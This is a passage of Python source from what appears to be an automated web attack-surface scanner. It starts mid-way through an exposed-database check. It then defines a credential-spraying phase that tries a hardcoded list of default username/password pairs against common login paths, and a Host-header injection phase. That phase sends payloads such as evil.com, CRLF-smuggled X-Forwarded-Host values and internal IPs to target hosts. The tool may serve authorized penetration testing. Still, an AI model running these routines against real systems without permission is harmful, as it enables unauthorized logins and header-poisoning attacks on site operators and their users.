                                body_text = db_body.decode("utf-8", errors="ignore")
                                if any(sig in body_text.lower() for sig in sigs):
                                    body_preview = body_text[:150]
                                    findings.append(
                                        f"  [exposed-service] {url} — HTTP {s} — {label} "
                                        f"body: {body_preview[:100]}"
                                    )
                                    confirmed = True
                                    break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                sock.close()
                if confirmed:
                    findings.append(f"[exposed-db-port] {host_clean}:{port} — {label} — port open")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
    if not findings:
        findings.append("[exposed-db] No exposed database services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"56-EXPOSED-DB: {len(findings)} exposure findings → {out}")
    return {"56-EXPOSED-DB": str(out), "count": len(findings)}


_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", "letmein"),
    ("admin", "root"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "toor"),
    ("user", "user"),
    ("user", "password"),
    ("user", "123456"),
    ("guest", "guest"),
    ("test", "test"),
    ("demo", "demo"),
    ("administrator", "administrator"),
    ("admin", "Passw0rd!"),
    ("admin", "p@ssw0rd"),
    ("admin", "changeme"),
    ("admin", "1234"),
    ("tomcat", "tomcat"),
    ("admin", "s3cr3t"),
    ("admin", "1q2w3e4r"),
    ("admin", "qwerty"),
    ("pi", "raspberry"),
    ("ubnt", "ubnt"),
    ("manager", "manager"),
    ("kibana", "kibana"),
    ("elastic", "changeme"),
    ("kibana", "changeme"),
]


async def phase_57_DEFAULT_CREDS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"57-DEFAULT-CREDS"}:
        return {}
    _out = outdir / "default_creds.txt"
    if _out.exists() and not force:
        return {"57-DEFAULT-CREDS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 57-DEFAULT-CREDS: default credentials probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("WARNING", "57-DEFAULT-CREDS: no hosts; skipping")
        return {"57-DEFAULT-CREDS": str(_out), "count": 0}

    login_paths = [
        "/login",
        "/admin",
        "/admin/login",
        "/wp-admin",
        "/api/login",
        "/api/auth",
        "/auth",
        "/signin",
        "/dashboard",
        "/manager",
        "/console",
        "/jenkins/login",
        "/admin.html",
        "/login.html",
        "/administrator",
        "/user/login",
        "/api/v1/login",
    ]

    skip_indicators = [
        "invalid",
        "incorrect",
        "unauthorized",
        "forbidden",
        "access denied",
        "wrong",
        "login failed",
        "authentication failed",
    ]
    _cred_form_fields = [
        ("username", "password"),
        ("user", "pass"),
        ("login", "password"),
        ("email", "password"),
    ]
    _cred_auth_markers = ["dashboard", "logout", "welcome", "account", "profile", "admin panel"]

    for host in hosts[:15]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for path in login_paths[:5]:
                url = f"{base}{path}"
                try:
                    probe_req = urllib.request.Request(
                        url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers},
                    )
                    probe_s, probe_headers, _ = await _async_urlopen(
                        _d_urlopen, probe_req, timeout=8
                    )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
                if "basic" in str(probe_headers.get("WWW-Authenticate", "")).lower():
                    found = False
                    for username, password in _DEFAULT_CREDS[:10]:
                        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
                        try:
                            req = urllib.request.Request(
                                url,
                                method="GET",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Authorization": f"Basic {creds_b64}",
                                    **_d_extra_headers,
                                },
                            )
                            s, _, body = await _async_urlopen(_d_urlopen, req, timeout=8)
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                        body_lower = body.decode("utf-8", errors="ignore").lower()
                        if s == 200 and not any(ind in body_lower for ind in skip_indicators):
                            findings.append(
                                f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s} (basic auth)"
                            )
                            found = True
                            break
                    if found:
                        break
                    continue
                if probe_s not in (200, 201, 204):
                    continue
                found = False
                for username, password in _DEFAULT_CREDS[:10]:
                    for fields in _cred_form_fields:
                        form = urllib.parse.urlencode(
                            {fields[0]: username, fields[1]: password}
                        ).encode()
                        try:
                            req = urllib.request.Request(
                                url,
                                data=form,
                                method="POST",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    **_d_extra_headers,
                                },
                            )
                            s, hdrs, body = await _async_urlopen_no_redirect(req, timeout=8)
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                        body_lower = body.decode("utf-8", errors="ignore").lower()
                        if any(ind in body_lower for ind in skip_indicators):
                            continue
                        set_cookie = str(hdrs.get("Set-Cookie", "")).lower()
                        has_session = any(
                            k in set_cookie for k in ("session", "sid", "auth", "token")
                        )
                        if (
                            s == 200
                            and has_session
                            and any(m in body_lower for m in _cred_auth_markers)
                        ):
                            findings.append(
                                f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s}"
                            )
                            found = True
                            break
                        if s in (301, 302, 303) and has_session:
                            location = str(hdrs.get("Location", ""))
                            loc_parsed = urllib.parse.urlparse(location)
                            if (
                                not loc_parsed.netloc or loc_parsed.netloc == host_clean
                            ) and loc_parsed.path.rstrip("/") != path.rstrip("/"):
                                findings.append(
                                    f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s} (redirect in app)"
                                )
                                found = True
                                break
                    if found:
                        break
                if found:
                    break
            else:
                continue
            break

    if not findings:
        findings.append("[default-creds] No default credentials accepted")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"57-DEFAULT-CREDS: {len(findings)} default cred findings → {out}")
    return {"57-DEFAULT-CREDS": str(out), "count": len(findings)}


# ────────────────── Phase 58-HOST-INJECT: Host Header Injection ─────────────────
_HOST_INJECT_PAYLOADS = [
    "evil.com",
    "evil.com:443",
    "x: 127.0.0.1@evil.com",
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "192.168.1.1",
    "172.16.0.1",
    "x: 0",
    "x: 1",
    "evil.com\\r\\nX-Forwarded-Host: evil.com",
    "evil.com\\u010d\\nX-Forwarded-Host: evil.com",
    "evil.com\\u2028\\nX-Forwarded-Host: evil.com",
    "evil.com%250d%250aX-Forwarded-Host: evil.com",
    "null",
    "target.com@evil.com",
    "target.com:evil.com",
]


async def phase_58_HOST_INJECT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"58-HOST-INJECT"}:
        return {}
    _out = outdir / "host_header_injection.txt"
    if _out.exists() and not force:
        return {"58-HOST-INJECT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 58-HOST-INJECT: host header injection testing")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("WARNING", "58-HOST-INJECT: no hosts; skipping")
        return {"58-HOST-INJECT": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            orig_fwd = None
            try:
                base_req = urllib.request.Request(
                    url, method="GET", headers={"User-Agent": "Mozilla/5.0"}
                )
                _, base_headers, base_body = await _async_urlopen(_h_urlopen, base_req, timeout=8)
                orig_fwd = base_headers.get("X-Forwarded-Host", "")
                base_body_str = base_body.decode("utf-8", errors="ignore")
            except asyncio.CancelledError:
                raise
            except Exception:
                base_body_str = ""
            for payload in _HOST_INJECT_PAYLOADS:
                try:
                    req = urllib.request.Request(
                        url,
                        method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Host": payload,
                            "X-Forwarded-Host": payload,
                            "X-Forwarded-Scheme": "http" if payload == "evil.com" else "https",
                        },
                    )
                    s, resp_headers, resp_body = await _async_urlopen(_h_urlopen, req, timeout=8)
                    resp_body_str = resp_body.decode("utf-8", errors="ignore")
                    if payload in resp_body_str:
                        findings.append(
                            f"[host-inject-reflected] {url} — Host: {payload} — reflected in body"
                        )
                    if "evil.com" in resp_headers.get(
                        "Location", ""
                    ) or "evil.com" in resp_headers.get("Content-Location", ""):
                        findings.append(
                            f"[host-inject-redirect] {url} — Host: {payload} — redirect to attacker domain"
                        )
                    if resp_headers.get("X-Forwarded-Host", "") != orig_fwd:
                        findings.append(f"[host-inject-fwd] {url} — Host: {payload} — XFH modified")
                    if resp_headers.get("Set-Cookie", "") and payload != host_clean:
                        findings.append(
                            f"[host-inject-cookie] {url} — Host: {payload} — cookie set under manipulated host"
                        )
                    base_len = len(base_body_str)
                    if base_len and abs(len(resp_body_str) - base_len) > 100:
                        findings.append(
                            f"[host-inject-diff] {url} — Host: {payload} — response size differs by {abs(len(resp_body_str) - base_len)} bytes"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[host-inject] No host header injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"58-HOST-INJECT: {len(findings)} host header injection findings → {out}")
    return {"58-HOST-INJECT": str(out), "count": len(findings)}
